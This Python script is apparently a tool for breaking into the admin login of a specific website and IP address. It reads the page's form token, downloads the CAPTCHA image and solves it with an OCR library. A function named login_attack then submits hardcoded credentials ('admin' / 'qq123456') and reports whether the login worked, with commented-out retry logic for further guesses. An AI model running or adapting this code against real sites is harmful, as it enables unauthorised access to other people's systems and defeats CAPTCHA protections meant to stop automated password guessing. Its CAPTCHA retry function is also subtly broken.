#
import ddddocr, uuid, datetime, stat, secrets
import requests, json, re, os, time, random
from bs4 import BeautifulSoup

base_captcha = "captcha"

base_url = "http://www.ximimim.top:1008"
route_login = "/admin/common/login.shtml"
route_captcha = "/captcha.shtml"
session_request = requests.Session()


def img_ocr(img):
    ocr = ddddocr.DdddOcr()  # 实例化
    with open(str(img), 'rb') as f:  # 打开图片
        img_bytes = f.read()  # 读取图片
    res = ocr.classification(img_bytes)  # 识别
    # print(res)
    return res


def cur_create_dir():  # 创建当前日期目录
    year_month_day = datetime.datetime.now().strftime('%Y-%m-%d')

    save_file_path = os.path.join(base_captcha, year_month_day)

    if not os.path.exists(save_file_path):
        os.makedirs(save_file_path)
        os.chmod(save_file_path, stat.S_IRWXU)  # Linux下可读可写

    return save_file_path


def create_uuid_png_name():
    get_timestamp_uuid = uuid.uuid1()  # 根据 时间戳生成 uuid , 保证全球唯一
    return datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S') + "-" + str(get_timestamp_uuid) + ".png"


def get_captcha_photo(url, captcha_uuid_name):  # 获取验证码图片
    header = {'Cookie': 'PHPSESSID=0'}
    url = url + route_captcha
    res = requests.get(url=url, headers=header, verify=False)
    with open(captcha_uuid_name, 'wb') as f:
        f.write(res.content)
    return captcha_uuid_name


def proto_to_captcha1(url, img_path):  # 获取验证码图片并且识别转验证码
    # 获取图片
    zh_model = re.compile(u'[\u4e00-\u9fa5]')  # u4e00 和 u9fa5 是中文的两个端点
    img_name = get_captcha_photo(url, img_path)  # 获取验证码并返回完整路径
    res = img_ocr(img_name)
    # 判断字符串是否仅由数字字符或者字母数字组成
    if (res.isdigit() or res.isalnum()) and not zh_model.search(res):
        return res
    else:
        print(res, "404error")
        proto_to_captcha1(url, img_path)
        print("走到这里")


def get_captcha_code():  # 获取到正确验证码
    # 创建目录
    dir_path = cur_create_dir()
    # 生成图片名称
    uuid = create_uuid_png_name()
    # 获取验证码并识别
    captcha_code = proto_to_captcha1(base_url, dir_path + "/" + uuid)
    print("captcha_code=", captcha_code)
    return captcha_code


def login_token():
    response = requests.get(base_url + route_login)
    # 使用 BeautifulSoup 解析 HTML 页面
    soup = BeautifulSoup(response.content, 'html.parser')
    # 获取 __token__ 的值
    token = soup.find('input', {'name': '__token__'}).get('value')
    print(token)
    return token


def login_attack(username, password, code, token):
    # 请求参数
    # data = {'name': username, 'password': password, 'captcha': code, '__token__': token}
    data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)
    print(data)
    header = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        # 'Cookie': 'PHPSESSID=gq0npeainecd9vn5si0vqb08g0'
    }
    #  + secrets.token_hex(13),
    # data = urllib3.urlencode(postData)
    # res = requests.post(url=base_url + route_login, data=data, headers=header, verify=False)
    res = requests.post(url=base_url + route_login, data=data, headers=header)
    result = json.loads(res.text)
    print("xxx11", result)
    return result


#  python http://www.ximimim.top:1008/admin/common/login.shtml 获取 这个页面中 <input type="hidden" name="__token__" value="xx"> 其中value的值 和 获取标签id等于captcha的img 图标内容 并且写入文件中
def main():
    # url = "http://47.109.19.59:7070/admin/common/login.shtml"
    url = "http://47.109.19.59:7070"
    img = "captcha.png"


if __name__ == '__main__':
    token = login_token()
    captcha_code = get_captcha_code()
    username = "admin"
    password = "qq123456"
    login_info = login_attack(username, password, captcha_code, token)
    print(login_info)
    if login_info['code'] == 1:
        print("登录成功,用户名{0},密码{1}".format(username, password))
    else:
        pass
        # print(login_info['msg'])
        # if "验证码不正确" in print['msg']:
        #     print("重试1次,本次密码{0},验证码{1}".format(password, captcha_code))
